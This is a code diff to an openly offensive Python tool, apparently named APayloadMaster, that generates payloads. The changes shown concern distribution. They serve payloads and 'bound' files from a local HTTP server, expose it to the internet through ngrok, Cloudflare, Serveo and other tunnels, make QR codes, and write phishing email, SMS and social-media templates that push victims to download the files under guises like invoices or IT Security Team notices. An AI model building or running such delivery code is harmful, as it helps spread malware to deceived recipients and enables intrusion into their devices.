@@ -1376,7 +1376,7 @@ exploit -j
         except ImportError:
             print(f"{self.colors.RED}[!] QRCode module not installed. Install with: pip3 install qrcode[pil]{self.colors.ENDC}")
             return
-        self.start_http_server(8080, serve_path=filepath)
+        self.start_http_server(8080, serve_path=filepath, foreground=False)
         filename = os.path.basename(filepath)
         qr_data = f"http://{self.local_ip}:8080/{urllib.parse.quote(filename)}"
         qr = qrcode.QRCode(version=1, box_size=10, border=5)
@@ -1421,10 +1421,13 @@ IconIndex=0
             f.write(launcher_content)
         print(f"{self.colors.GREEN}[+] Android launcher config created: {launcher_file}{self.colors.ENDC}")
     
-    def start_http_server(self, port=8080, global_access=False, serve_path=None):
-        """Start HTTP server serving the given path (file or directory). If None, serve server/uploads."""
-        if self.http_server:
-            print(f"{self.colors.YELLOW}[*] HTTP server already running{self.colors.ENDC}")
+    def start_http_server(self, port=8080, global_access=False, serve_path=None, foreground=False):
+        """
+        Start HTTP server serving the given path (file or directory).
+        If foreground=True, run in current thread (blocking). Otherwise, run in background thread.
+        """
+        if self.http_server and not foreground:
+            print(f"{self.colors.YELLOW}[*] HTTP server already running in background{self.colors.ENDC}")
             return
 
         # Determine what to serve
@@ -1432,26 +1435,22 @@ IconIndex=0
             serve_path = "server/uploads"
             if self.current_payload:
                 shutil.copy2(self.current_payload, serve_path)
-        else:
-            # If it's a file, we'll serve its directory and the file will be accessible
-            # For simplicity, if it's a file, we copy it to server/uploads (as before)
-            if os.path.isfile(serve_path):
-                os.makedirs("server/uploads", exist_ok=True)
-                shutil.copy2(serve_path, "server/uploads")
-                serve_path = "server/uploads"
-            # If it's a directory, we'll serve that directory directly
-            elif os.path.isdir(serve_path):
-                # Change to that directory
-                pass
-            else:
-                print(f"{self.colors.RED}[!] Invalid serve path.{self.colors.ENDC}")
-                return
-
-        original_dir = os.getcwd()
-        if os.path.isdir(serve_path):
+        elif os.path.isfile(serve_path):
+            # If it's a file, we serve its directory and the file will be accessible
+            serve_dir = os.path.dirname(serve_path)
+            if not serve_dir:
+                serve_dir = "."
+            # Change to that directory
+            original_dir = os.getcwd()
+            os.chdir(serve_dir)
+            print(f"{self.colors.GREEN}[*] Serving file: {os.path.basename(serve_path)} from {serve_dir}{self.colors.ENDC}")
+        elif os.path.isdir(serve_path):
+            original_dir = os.getcwd()
             os.chdir(serve_path)
+            print(f"{self.colors.GREEN}[*] Serving directory: {serve_path}{self.colors.ENDC}")
         else:
-            os.chdir(os.path.dirname(serve_path))
+            print(f"{self.colors.RED}[!] Invalid serve path.{self.colors.ENDC}")
+            return
 
         class FileHandler(http.server.SimpleHTTPRequestHandler):
             def log_message(self, format, *args):
@@ -1460,22 +1459,40 @@ IconIndex=0
 
         def run_server():
             with socketserver.TCPServer(("", int(port)), FileHandler) as httpd:
-                self.http_server = httpd
+                self.http_server = httpd if not foreground else None
                 print(f"{self.colors.GREEN}[+] HTTP server started on port {port}{self.colors.ENDC}")
                 print(f"{self.colors.CYAN}[*] Serving files from: {os.getcwd()}{self.colors.ENDC}")
                 if global_access:
-                    # Tunnel already set up; we already printed the public URL
-                    pass
-                httpd.serve_forever()
+                    print(f"{self.colors.CYAN}[*] Global access enabled via tunnel{self.colors.ENDC}")
+                try:
+                    httpd.serve_forever()
+                except KeyboardInterrupt:
+                    print(f"\n{self.colors.YELLOW}[*] Server stopped{self.colors.ENDC}")
+                finally:
+                    if foreground:
+                        # Return to original directory
+                        os.chdir(original_dir)
 
-        thread = threading.Thread(target=run_server)
-        thread.daemon = True
-        thread.start()
-        os.chdir(original_dir)
+        if foreground:
+            # Run in current thread (blocking)
+            try:
+                run_server()
+            except KeyboardInterrupt:
+                pass
+            finally:
+                # After server stops, we return to menu automatically
+                pass
+        else:
+            # Background thread
+            thread = threading.Thread(target=run_server)
+            thread.daemon = True
+            thread.start()
+            # Change back to original dir for the main thread
+            os.chdir(original_dir)
     
-    def generate_email_template(self, filepath):
+    def generate_email_template(self, filepath, base_url):
         filename = os.path.basename(filepath)
-        download_url = f"http://{self.local_ip}:8080/{filename}"
+        download_url = f"{base_url}/{filename}"
         template = f"""
 === EMAIL TEMPLATE ===
 Subject: Important Document / Invoice / Update
@@ -1508,9 +1525,9 @@ IT Security Team
             f.write(template)
         print(f"{self.colors.GREEN}[+] Email template saved: {template_file}{self.colors.ENDC}")
     
-    def generate_sms_template(self, filepath):
+    def generate_sms_template(self, filepath, base_url):
         filename = os.path.basename(filepath)
-        download_url = f"http://{self.local_ip}:8080/{filename}"
+        download_url = f"{base_url}/{filename}"
         template = f"""
 === SMS TEMPLATE ===
 
@@ -1529,9 +1546,9 @@ Your document is ready: {download_url}
             f.write(template)
         print(f"{self.colors.GREEN}[+] SMS template saved: {template_file}{self.colors.ENDC}")
     
-    def generate_social_media_message(self, filepath):
+    def generate_social_media_message(self, filepath, base_url):
         filename = os.path.basename(filepath)
-        download_url = f"http://{self.local_ip}:8080/{filename}"
+        download_url = f"{base_url}/{filename}"
         template = f"""
 === SOCIAL MEDIA TEMPLATE ===
 
@@ -1553,6 +1570,141 @@ New tool release! Download from: {download_url}
         with open(template_file, 'w') as f:
             f.write(template)
         print(f"{self.colors.GREEN}[+] Social media template saved: {template_file}{self.colors.ENDC}")
+    
+    def distribution_menu(self, filepath):
+        """Enhanced distribution: choose file and make it global via tunnel."""
+        # Ask which file to distribute
+        print(f"\n{self.colors.CYAN}[DISTRIBUTION OPTIONS]{self.colors.ENDC}")
+        print("1. Use current payload")
+        print("2. Choose a file from output/payloads")
+        print("3. Choose a file from output/bound")
+        print("4. Enter custom path")
+        print("5. Cancel")
+        choice = input(f"{self.colors.YELLOW}[?] Select option (1-5, default 1): {self.colors.ENDC}") or "1"
+        
+        selected_file = None
+        if choice == "1":
+            selected_file = filepath
+        elif choice == "2":
+            dir_path = "output/payloads"
+            if not os.path.exists(dir_path):
+                print(f"{self.colors.RED}[!] Directory not found.{self.colors.ENDC}")
+                return
+            files = [f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))]
+            if not files:
+                print(f"{self.colors.RED}[!] No files found.{self.colors.ENDC}")
+                return
+            print(f"{self.colors.CYAN}Files in {dir_path}:{self.colors.ENDC}")
+            for i, f in enumerate(files, 1):
+                print(f"{i}. {f}")
+            idx = input(f"{self.colors.YELLOW}[?] Select file number: {self.colors.ENDC}")
+            try:
+                idx = int(idx) - 1
+                if 0 <= idx < len(files):
+                    selected_file = os.path.join(dir_path, files[idx])
+                else:
+                    print(f"{self.colors.RED}[!] Invalid selection.{self.colors.ENDC}")
+                    return
+            except:
+                print(f"{self.colors.RED}[!] Invalid input.{self.colors.ENDC}")
+                return
+        elif choice == "3":
+            dir_path = "output/bound"
+            if not os.path.exists(dir_path):
+                print(f"{self.colors.RED}[!] Directory not found.{self.colors.ENDC}")
+                return
+            files = [f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))]
+            if not files:
+                print(f"{self.colors.RED}[!] No files found.{self.colors.ENDC}")
+                return
+            print(f"{self.colors.CYAN}Files in {dir_path}:{self.colors.ENDC}")
+            for i, f in enumerate(files, 1):
+                print(f"{i}. {f}")
+            idx = input(f"{self.colors.YELLOW}[?] Select file number: {self.colors.ENDC}")
+            try:
+                idx = int(idx) - 1
+                if 0 <= idx < len(files):
+                    selected_file = os.path.join(dir_path, files[idx])
+                else:
+                    print(f"{self.colors.RED}[!] Invalid selection.{self.colors.ENDC}")
+                    return
+            except:
+                print(f"{self.colors.RED}[!] Invalid input.{self.colors.ENDC}")
+                return
+        elif choice == "4":
+            path = input(f"{self.colors.YELLOW}[?] Enter full path: {self.colors.ENDC}")
+            if os.path.isfile(path):
+                selected_file = path
+            else:
+                print(f"{self.colors.RED}[!] File not found.{self.colors.ENDC}")
+                return
+        else:
+            return
+        
+        # Ask for port
+        port = input(f"{self.colors.YELLOW}[?] Enter port for HTTP server (default: 8080): {self.colors.ENDC}") or "8080"
+        
+        # Ask if global access
+        global_choice = input(f"{self.colors.YELLOW}[?] Make the download link globally accessible via tunnel? (y/n, default n): {self.colors.ENDC}").lower()
+        base_url = None
+        if global_choice == 'y':
+            print(f"{self.colors.CYAN}[*] Choose a tunnel service:{self.colors.ENDC}")
+            print("1. Ngrok")
+            print("2. LocalXpose")
+            print("3. Cloudflare")
+            print("4. Serveo")
+            print("5. Pinggy")
+            tunnel_choice = input(f"{self.colors.YELLOW}[?] Select option (1-5): {self.colors.ENDC}")
+            tunnel_map = {
+                '1': 'ngrok',
+                '2': 'localxpose',
+                '3': 'cloudflared',
+                '4': 'serveo',
+                '5': 'pinggy'
+            }
+            tunnel_type = tunnel_map.get(tunnel_choice)
+            if tunnel_type:
+                if tunnel_type == 'ngrok':
+                    public_url = self.setup_ngrok(int(port), is_http=True)
+                    if public_url and isinstance(public_url, tuple):
+                        host, port_num = public_url
+                        if port_num == '443' or 'ngrok' in host:
+                            base_url = f"https://{host}"
+                        else:
+                            base_url = f"http://{host}:{port_num}"
+                    elif isinstance(public_url, str):
+                        base_url = public_url
+                elif tunnel_type == 'localxpose':
+                    host, port_num = self.setup_localxpose(int(port), is_http=True)
+                    base_url = f"https://{host}" if host else None
+                elif tunnel_type == 'cloudflared':
+                    host, port_num = self.setup_cloudflare(int(port))
+                    base_url = f"https://{host}" if host else None
+                elif tunnel_type == 'serveo':
+                    host, port_num = self.setup_serveo(int(port), is_http=True)
+                    base_url = f"https://{host}" if host else None
+                elif tunnel_type == 'pinggy':
+                    host, port_num = self.setup_pinggy(int(port), is_http=True)
+                    base_url = f"https://{host}" if host else None
+            else:
+                print(f"{self.colors.RED}[!] Invalid choice. Using local link.{self.colors.ENDC}")
+        
+        if not base_url:
+            # Local link
+            base_url = f"http://{self.local_ip}:{port}"
+        
+        # Ensure base_url ends with /
+        if not base_url.endswith('/'):
+            base_url += '/'
+        
+        # Start HTTP server (background) serving the directory of the selected file
+        serve_dir = os.path.dirname(selected_file)
+        self.start_http_server(int(port), global_access=bool(global_choice=='y'), serve_path=serve_dir, foreground=False)
+        
+        # Generate templates
+        self.generate_email_template(selected_file, base_url)
+        self.generate_sms_template(selected_file, base_url)
+        self.generate_social_media_message(selected_file, base_url)
     
     def create_download_link(self, filepath):
         # Enhanced menu: choose what to serve
@@ -1598,6 +1750,7 @@ New tool release! Download from: {download_url}
         
         # Ask if user wants global access
         global_choice = input(f"{self.colors.YELLOW}[?] Make this download link accessible over the internet? (y/n, default n): {self.colors.ENDC}").lower()
+        base_url = None
         if global_choice == 'y':
             print(f"{self.colors.CYAN}[*] Choose a tunnel service for global access:{self.colors.ENDC}")
             print("1. Ngrok")
@@ -1615,59 +1768,46 @@ New tool release! Download from: {download_url}
             }
             tunnel_type = tunnel_map.get(tunnel_choice)
             if tunnel_type:
-                # Use the same manual tunnel setup functions, but for HTTP
                 if tunnel_type == 'ngrok':
                     public_url = self.setup_ngrok(int(port), is_http=True)
                     if public_url and isinstance(public_url, tuple):
-                        # setup_ngrok returns (host, port) but we need full URL for HTTP
-                        # Reconstruct URL
                         host, port_num = public_url
-                        # Determine protocol: if port is 443 or if it's ngrok, assume https
                         if port_num == '443' or 'ngrok' in host:
-                            public_url = f"https://{host}"
+                            base_url = f"https://{host}"
                         else:
-                            public_url = f"http://{host}:{port_num}"
+                            base_url = f"http://{host}:{port_num}"
                     elif isinstance(public_url, str):
-                        # Already a URL?
-                        pass
+                        base_url = public_url
                 elif tunnel_type == 'localxpose':
                     host, port_num = self.setup_localxpose(int(port), is_http=True)
-                    public_url = f"https://{host}" if host else None
+                    base_url = f"https://{host}" if host else None
                 elif tunnel_type == 'cloudflared':
                     host, port_num = self.setup_cloudflare(int(port))
-                    public_url = f"https://{host}" if host else None
+                    base_url = f"https://{host}" if host else None
                 elif tunnel_type == 'serveo':
                     host, port_num = self.setup_serveo(int(port), is_http=True)
-                    public_url = f"https://{host}" if host else None
+                    base_url = f"https://{host}" if host else None
                 elif tunnel_type == 'pinggy':
                     host, port_num = self.setup_pinggy(int(port), is_http=True)
-                    public_url = f"https://{host}" if host else None
-                else:
-                    public_url = None
+                    base_url = f"https://{host}" if host else None
+            if not base_url:
+                print(f"{self.colors.RED}[!] Failed to set up tunnel. Using local link only.{self.colors.ENDC}")
 
-                if public_url:
-                    # Ensure URL ends with /
-                    if not public_url.endswith('/'):
-                        public_url += '/'
-                    # For directory serving, we show the base URL; for file, append filename
-                    if os.path.isfile(serve_path):
-                        filename = os.path.basename(serve_path)
-                        download_url = f"{public_url}{filename}"
-                    else:
-                        download_url = public_url
-                    print(f"{self.colors.GREEN}[+] Global download link: {download_url}{self.colors.ENDC}")
-                    self.start_http_server(int(port), global_access=True, serve_path=serve_path)
-                else:
-                    print(f"{self.colors.RED}[!] Failed to set up tunnel. Using local link only.{self.colors.ENDC}")
-                    self._print_local_link(port, serve_path)
-                    self.start_http_server(int(port), serve_path=serve_path)
+        if base_url:
+            # Ensure URL ends with /
+            if not base_url.endswith('/'):
+                base_url += '/'
+            # For directory serving, we show the base URL; for file, append filename
+            if os.path.isfile(serve_path):
+                filename = os.path.basename(serve_path)
+                download_url = f"{base_url}{filename}"
             else:
-                print(f"{self.colors.RED}[!] Invalid choice. Using local link only.{self.colors.ENDC}")
-                self._print_local_link(port, serve_path)
-                self.start_http_server(int(port), serve_path=serve_path)
+                download_url = base_url
+            print(f"{self.colors.GREEN}[+] Global download link: {download_url}{self.colors.ENDC}")
+            self.start_http_server(int(port), global_access=True, serve_path=serve_path, foreground=False)
         else:
             self._print_local_link(port, serve_path)
-            self.start_http_server(int(port), serve_path=serve_path)
+            self.start_http_server(int(port), serve_path=serve_path, foreground=False)
 
     def _print_local_link(self, port, serve_path):
         if os.path.isfile(serve_path):
@@ -1752,8 +1892,55 @@ New tool release! Download from: {download_url}
                     self.ask_start_listener()
             elif choice == "5":
                 port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
+                # Ask what to serve – now default to output directory
+                print(f"\n{self.colors.CYAN}[HTTP SERVER OPTIONS]{self.colors.ENDC}")
+                print("1. Serve entire output directory (default)")
+                print("2. Serve current payload only")
+                print("3. Serve a file from output/bound")
+                print("4. Cancel")
+                serve_choice = input(f"{self.colors.YELLOW}[?] Select option (1-4, default 1): {self.colors.ENDC}") or "1"
+                serve_path = None
+                if serve_choice == "1":
+                    serve_path = "output"
+                elif serve_choice == "2":
+                    if self.current_payload:
+                        serve_path = self.current_payload
+                    else:
+                        print(f"{self.colors.RED}[!] No current payload. Please generate one first.{self.colors.ENDC}")
+                        continue
+                elif serve_choice == "3":
+                    bound_dir = "output/bound"
+                    if not os.path.exists(bound_dir):
+                        print(f"{self.colors.RED}[!] output/bound directory does not exist.{self.colors.ENDC}")
+                        continue
+                    files = [f for f in os.listdir(bound_dir) if os.path.isfile(os.path.join(bound_dir, f))]
+                    if not files:
+                        print(f"{self.colors.RED}[!] No files found in output/bound.{self.colors.ENDC}")
+                        continue
+                    print(f"{self.colors.CYAN}Files in output/bound:{self.colors.ENDC}")
+                    for i, f in enumerate(files, 1):
+                        print(f"{i}. {f}")
+                    file_choice = input(f"{self.colors.YELLOW}[?] Select file number: {self.colors.ENDC}")
+                    try:
+                        idx = int(file_choice) - 1
+                        if 0 <= idx < len(files):
+                            serve_path = os.path.join(bound_dir, files[idx])
+                        else:
+                            print(f"{self.colors.RED}[!] Invalid selection.{self.colors.ENDC}")
+                            continue
+                    except:
+                        print(f"{self.colors.RED}[!] Invalid input.{self.colors.ENDC}")
+                        continue
+                else:
+                    continue
+
+                # Ask about foreground/background
+                fg_choice = input(f"{self.colors.YELLOW}[?] Run server in foreground (this terminal) or background? (f/b, default b): {self.colors.ENDC}").lower()
+                foreground = (fg_choice == 'f')
+
                 # Option to make it global
                 global_choice = input(f"{self.colors.YELLOW}[?] Make this server accessible over the internet? (y/n, default n): {self.colors.ENDC}").lower()
+                base_url = None
                 if global_choice == 'y':
                     print(f"{self.colors.CYAN}[*] Choose a tunnel service:{self.colors.ENDC}")
                     print("1. Ngrok")
@@ -1776,37 +1963,33 @@ New tool release! Download from: {download_url}
                             if public_url and isinstance(public_url, tuple):
                                 host, port_num = public_url
                                 if port_num == '443' or 'ngrok' in host:
-                                    public_url = f"https://{host}"
+                                    base_url = f"https://{host}"
                                 else:
-                                    public_url = f"http://{host}:{port_num}"
+                                    base_url = f"http://{host}:{port_num}"
                             elif isinstance(public_url, str):
-                                pass
+                                base_url = public_url
                         elif tunnel_type == 'localxpose':
                             host, port_num = self.setup_localxpose(int(port), is_http=True)
-                            public_url = f"https://{host}" if host else None
+                            base_url = f"https://{host}" if host else None
                         elif tunnel_type == 'cloudflared':
                             host, port_num = self.setup_cloudflare(int(port))
-                            public_url = f"https://{host}" if host else None
+                            base_url = f"https://{host}" if host else None
                         elif tunnel_type == 'serveo':
                             host, port_num = self.setup_serveo(int(port), is_http=True)
-                            public_url = f"https://{host}" if host else None
+                            base_url = f"https://{host}" if host else None
                         elif tunnel_type == 'pinggy':
                             host, port_num = self.setup_pinggy(int(port), is_http=True)
-                            public_url = f"https://{host}" if host else None
-                        else:
-                            public_url = None
-
-                        if public_url:
-                            print(f"{self.colors.GREEN}[+] Global HTTP server URL: {public_url}{self.colors.ENDC}")
-                            self.start_http_server(int(port), global_access=True, serve_path="server/uploads")
-                        else:
-                            print(f"{self.colors.RED}[!] Failed to set up tunnel. Starting local server only.{self.colors.ENDC}")
-                            self.start_http_server(int(port), serve_path="server/uploads")
+                            base_url = f"https://{host}" if host else None
+                    if base_url:
+                        print(f"{self.colors.GREEN}[+] Global HTTP server URL: {base_url}{self.colors.ENDC}")
                     else:
-                        print(f"{self.colors.RED}[!] Invalid choice. Starting local server only.{self.colors.ENDC}")
-                        self.start_http_server(int(port), serve_path="server/uploads")
+                        print(f"{self.colors.RED}[!] Failed to set up tunnel. Starting local server only.{self.colors.ENDC}")
+
+                if foreground:
+                    print(f"{self.colors.YELLOW}[*] Starting server in foreground. Press Ctrl+C to stop.{self.colors.ENDC}")
+                    self.start_http_server(int(port), global_access=bool(global_choice=='y' and base_url), serve_path=serve_path, foreground=True)
                 else:
-                    self.start_http_server(int(port), serve_path="server/uploads")
+                    self.start_http_server(int(port), global_access=bool(global_choice=='y' and base_url), serve_path=serve_path, foreground=False)
             elif choice == "6":
                 missing = self.check_dependencies()
                 if missing:
@@ -1821,11 +2004,6 @@ New tool release! Download from: {download_url}
                     self.http_server.shutdown()
                 print(f"{self.colors.GREEN}[+] Cleanup complete. Goodbye!{self.colors.ENDC}")
                 sys.exit(0)
-    
-    def distribution_menu(self, filepath):
-        self.generate_email_template(filepath)
-        self.generate_sms_template(filepath)
-        self.generate_social_media_message(filepath)
 
 def main():
     tool = APayloadMaster()
